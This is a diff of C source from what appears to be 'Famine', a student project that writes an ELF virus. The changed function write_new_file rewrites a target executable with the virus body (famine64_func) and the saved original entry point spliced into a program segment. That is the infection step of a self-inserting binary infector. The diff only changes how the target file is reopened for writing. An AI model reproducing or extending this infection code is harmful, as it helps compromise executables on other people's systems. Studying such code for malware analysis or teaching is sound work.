@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/11 15:41:56 by root              #+#    #+#             */
-/*   Updated: 2018/05/22 04:40:24 by root             ###   ########.fr       */
+/*   Updated: 2018/05/28 18:51:21 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -66,16 +66,19 @@ static void		write_new_file(t_env *e, t_elf64 *elf)
 {
 	char		*ptr;
 	size_t		off;
+	int			fd;
 
 	ptr = (char *)e->data;
 /* Get the offset in file to write our code */
 	off = elf->iprogram->p_offset + elf->iprogram->p_memsz - famine64_size;
-	write(e->fd, ptr, off);
-	write(e->fd, &famine64_func, famine64_size - sizeof(elf->old_entry));
-	write(e->fd, &elf->old_entry, sizeof(elf->old_entry));
-	write(e->fd, ptr + off, e->size - off);
-	close(e->fd);
-	e->fd = 0;
+	fd = open(e->path, O_WRONLY);
+	if (fd < 0)
+		return ;
+	write(fd, ptr, off);
+	write(fd, &famine64_func, famine64_size - sizeof(elf->old_entry));
+	write(fd, &elf->old_entry, sizeof(elf->old_entry));
+	write(fd, ptr + off, e->size - off);
+	close(fd);
 }
 
 /*
